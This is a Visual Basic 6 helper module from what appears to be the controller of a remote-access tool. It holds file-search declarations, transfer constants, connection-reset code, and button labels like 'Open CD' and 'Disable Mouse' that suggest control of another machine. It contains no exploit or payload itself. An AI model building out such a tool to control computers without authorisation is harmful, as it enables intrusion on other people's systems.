Attribute VB_Name = "Module1"
Option Explicit
'For File/dir manager
Public Type FILETIME
    dwLowDateTime As Long
    dwHighDateTime As Long
End Type
Public Type WIN32_FIND_DATA
    dwFileAttributes As Long
    ftCreationTime As FILETIME
    ftLastAccessTime As FILETIME
    ftLastWriteTime As FILETIME
    nFileSizeHigh As Long
    nFileSizeLow As Long
    dwReserved0 As Long
    dwReserved1 As Long
    cFileName As String * 255
    cAlternate As String * 14
End Type
Public Const PAKSEND = 4048
Public Const FILEDOWN = 1
Public Const FILEUPLD = 2
Public Const FILEDESK = 3

Private Const TH32CS_SNAPPROCESS = &H2
Private Const MAX_PATH As Integer = 260

'Api for Pause
Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

'API For File Manager
Public Declare Function FindFirstFile Lib "kernel32.dll" Alias "FindFirstFileA" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long


Function Extract(Temp As String) As String
Dim num As Long
Dim Finale As String
Dim appoggio As String

For num = 1 To Len(Temp)
    appoggio = Mid(Temp, num, 1)
    
    If appoggio = "*" Then
       Exit For
    End If
    Finale = Mid(Temp, 1, num)
Next num
Extract = Finale
End Function

Sub RecoveryLabel()
    Form1.Picture1.BackColor = &HFF&    'red
    Form1.Caption = "Client"
    Form1.List1.Clear
End Sub

Sub Noconnection()
    RecoveryLabel
    Form1.Winsock1.Close
    Form1.Command1.Caption = "Enable (Listen)"
    Form1.List1.Clear
    Form1.List1.AddItem "No Connected!", 0
    Form1.List2.Clear
    Form1.List3.Clear
    Form1.PercorsoAssoluto = ""
    Form1.Combo1.Clear
    Form1.Label2.Visible = False
    Form1.Text2.Visible = False
    Form1.List3.Text = ""
    Form1.FlagDown = False
    Form1.FlagUpld = False
    Form1.FlagDesk = False
End Sub
Sub ResetKey()
    Form1.Command16.Caption = "Open CD"
    Form1.Command11.Caption = "Disable Mouse"
    Form1.Command25.Caption = "Rename"
    Form1.Command25.FontBold = False
    Form1.Command24.Caption = "Make DIR"
    Form1.Command24.FontBold = False
    Form1.Text2.Visible = False
    Form1.Label2.Visible = False
    Form1.Command20.Caption = "Upload"
    Form1.Command20.FontBold = False
End Sub
Function FileExists(FileName As String) As Boolean
    On Error Resume Next
    FileExists = (GetAttr(FileName) And vbDirectory) = 0
End Function


